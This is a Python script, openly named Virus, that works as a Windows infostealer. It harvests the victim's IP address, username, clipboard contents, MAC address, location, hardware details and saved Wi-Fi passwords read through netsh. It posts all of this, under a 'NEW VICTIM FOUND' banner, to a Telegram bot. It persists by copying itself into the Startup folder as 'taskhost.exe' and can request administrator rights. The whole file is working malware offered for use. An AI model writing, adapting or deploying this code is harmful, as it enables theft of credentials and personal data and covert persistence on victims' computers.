import os
import shutil
import sys
import ctypes
import requests
import socket
import platform
import time
import psutil
import pyperclip
import wmi





class Virus:

    @staticmethod
    def send_to_telegram():
        try:
            ip = requests.get("https://api.ipify.org").text

            pc_name = socket.gethostname()

            username = os.getenv("USERNAME")

            os_info = platform.system() + " " + platform.release()
            system_info = wmi.WMI()


            for system in system_info.Win32_ComputerSystem():
                pass

            
            gpu_info = wmi.WMI().Win32_VideoController()
            for gpu in gpu_info:
                 pass
            try:
                battery = psutil.sensors_battery()
                pluggedin = psutil.sensors_battery().power_plugged
            except:
                battery = "Unknown"
                pluggedin = "Unknown"

            if pluggedin == True:
                pluggedin = "Yes"
            else:
                pluggedin = "No"

            if os.name == 'nt':
                wifi_passwords = os.popen("netsh wlan show profiles").read().splitlines()
                wifi_list = [line.split(":")[1][1:] for line in wifi_passwords if "All User Profile" in line]
    
                for wifi in wifi_list:
                    wifi_details = os.popen(f'netsh wlan show profile "{wifi}" key=clear').read()

            else:
                pass

            try:
                clipboard = pyperclip.paste()

            except Exception as e:
                return str(e)
            
            mac = os.popen("ipconfig /all").read()
            mac_address = None
            for line in mac.splitlines():
                if "Physical" in line: 
                    mac_address = line.split(":")[1].strip()
                    break 
                
            response = requests.get("https://ipinfo.io/json")
            data = response.json()
                    

            message = f"""
            😈 NEW VICTIM FOUND!😈
            -------------------------------------------------------------------
            IP Address: {ip}
            PC Name: {pc_name}
            Username: {username}
            OS: {os_info}
            CLIPBOARD: {clipboard}
            MAC ADDRESS: {mac_address}
            CITY: {data['city']} 
            STATE/PROVINCE/REGION: {data['region']} 
            COUNTRY: {data['country']}
            CPU NAME: {platform.processor()}
            CPU ARCHITECTURE: {platform.architecture()}
            CPU CORES: {psutil.cpu_count(logical=True)}
            MAX FREQUENCY: {psutil.cpu_freq().max} MHz
            CURRENT FREQUENCY: {psutil.cpu_freq().current} MHz
            GPU NAME: {gpu.Name}
            GPU DRIVER VERSION: {gpu.DriverVersion}
            GPU VRAM: {int(gpu.AdapterRAM) / (1024**3):.2f} GB
            MANUFACTURER: {system.Manufacturer}
            MODEL: {system.Model}
            BATTERY INFO: {battery.percent}%
            PLUGGED IN: {pluggedin}
            WIFI NAME: {wifi}
            WIFI PASSWORD: {wifi_details}

            -------------------------------------------------------------------
            """

            bot_token = "YOUR-BOT-TOKEN-HERE"
            chat_id = "YOUR-CHAT-ID-HERE"

            
            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
            payload = {"chat_id": chat_id, "text": message}
            response = requests.post(url, json=payload)

            if response.status_code == 200:
                pass

            else:
                pass

            

        except Exception as e:
            Virus.send_to_telegram()



    @staticmethod
    def add_to_startup():
        try:
            if getattr(sys, 'frozen', False):
                script_path = sys.executable

            else:
                script_path = os.path.abspath(__file__)

            startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            destination = os.path.join(startup_folder, os.path.basename(script_path))

            if not os.path.exists(destination):
                shutil.copy(script_path, destination)
                pass
            
            else:
                pass

        except Exception as e:
            Virus.add_to_startup()


    @staticmethod
    def request_admin():
        try:
            if not ctypes.windll.shell32.IsUserAnAdmin():
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
                sys.exit()

        except Exception as e:
            Virus.request_admin()



    @staticmethod
    def copy_and_rename():
        try:

            if getattr(sys, 'frozen', False):
                script_path = sys.executable  

            else:
                script_path = os.path.abspath(__file__)  

            
            new_name = 'taskhost.exe'  

           
            destination_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            destination = os.path.join(destination_folder, new_name)

            
            if not os.path.exists(destination):
                shutil.copy(script_path, destination)  

            else:
               pass


        except Exception as e:
           Virus.add_to_startup()




def main():
    # Virus.request_admin()
    Virus.copy_and_rename()
    Virus.send_to_telegram()



main()
